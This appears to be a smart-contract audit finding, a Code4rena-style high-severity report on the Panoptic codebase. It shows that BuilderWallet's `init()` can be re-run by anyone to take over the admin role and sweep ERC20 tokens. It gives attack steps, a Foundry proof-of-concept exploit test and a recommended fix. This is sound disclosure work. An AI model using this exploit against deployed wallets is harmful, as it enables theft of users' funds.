  "body": "## H-01 — BuilderWallet `init()` is permissionless and can be re-run to seize admin and steal funds\n\n**Severity:** High\n\n### Impact\n\nAny unprivileged attacker can become `builderAdmin` for any deployed BuilderWallet and steal all ERC20 tokens held by that wallet (e.g., builder fee/commission receipts).\n\n### Exploit narrative (attack steps)\n\nAssumptions:\n- A BuilderWallet exists (deployed by BuilderFactory) and holds ERC20 tokens.\n\nSteps:\n1. Call `BuilderWallet.init(attacker)`.\n2. Call `BuilderWallet.sweep(token, attacker)` for each token held.\n\n### Affected components / code references (GitHub links)\n\n- Unrestricted re-initialization: `https://github.com/code-423n4/2025-12-panoptic/blob/fe557748210a529ae414d7c487b6514be0d9e220/contracts/RiskEngine.sol#L2315`\n- Sweep gated only by `builderAdmin`: `https://github.com/code-423n4/2025-12-panoptic/blob/fe557748210a529ae414d7c487b6514be0d9e220/contracts/RiskEngine.sol#L2319`\n- Factory deploys wallet then calls `init` once (but does not prevent later calls): `https://github.com/code-423n4/2025-12-panoptic/blob/fe557748210a529ae414d7c487b6514be0d9e220/contracts/RiskEngine.sol#L2371`",
  "proof_of_concept": "Create a new file at:\n- `test/foundry/pocs/BuilderWalletInitHijack.t.sol`\n\nRun:\n\n```bash\nFOUNDRY_PROFILE=ci_test FOUNDRY_ETH_RPC_URL=https://ethereum.publicnode.com \\\n  forge test --match-path test/foundry/pocs/BuilderWalletInitHijack.t.sol\n```\n\nPoC code:\n\n```solidity\n// SPDX-License-Identifier: Unlicensed\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\n\nimport {BuilderFactory, BuilderWallet} from \"@contracts/RiskEngine.sol\";\n\nimport {ERC20S} from \"../testUtils/ERC20S.sol\";\n\ncontract BuilderWalletInitHijackPoC is Test {\n    function test_builderWallet_init_can_be_overwritten_by_anyone() public {\n        BuilderFactory factory = new BuilderFactory(address(this));\n\n        uint48 builderCode = 1234;\n        address legitBuilderAdmin = address(0xA11CE);\n\n        address walletAddr = factory.deployBuilder(builderCode, legitBuilderAdmin);\n        BuilderWallet wallet = BuilderWallet(walletAddr);\n\n        ERC20S token = new ERC20S(\"TestToken\", \"TST\", 18);\n        token.mint(walletAddr, 100e18);\n\n        address attacker = address(0xBEEF);\n\n        // Permissionless re-init: attacker becomes builderAdmin.\n        vm.prank(attacker);\n        wallet.init(attacker);\n\n        // Attacker can now sweep all funds.\n        vm.prank(attacker);\n        wallet.sweep(address(token), attacker);\n\n        assertEq(wallet.builderAdmin(), attacker);\n        assertEq(token.balanceOf(attacker), 100e18);\n        assertEq(token.balanceOf(walletAddr), 0);\n    }\n}\n```\n\n### Proof\n\n- `BuilderWallet.init(address)` is `external` and has **no** access control or one-time guard, so any EOA can overwrite `builderAdmin` at any time.\n- `BuilderWallet.sweep(...)` authorizes solely by `msg.sender == builderAdmin`, so once overwritten, theft is immediate.\n- The PoC mints an ERC20 balance to the wallet, overwrites `builderAdmin` from an attacker address, and successfully sweeps the full balance.\n\n### Recommendation (no code)\n\n- Restrict `init` to the factory (`msg.sender == FACTORY`) and make it single-use (`builderAdmin == address(0)`), or set `builderAdmin` at construction time and remove `init` entirely.",
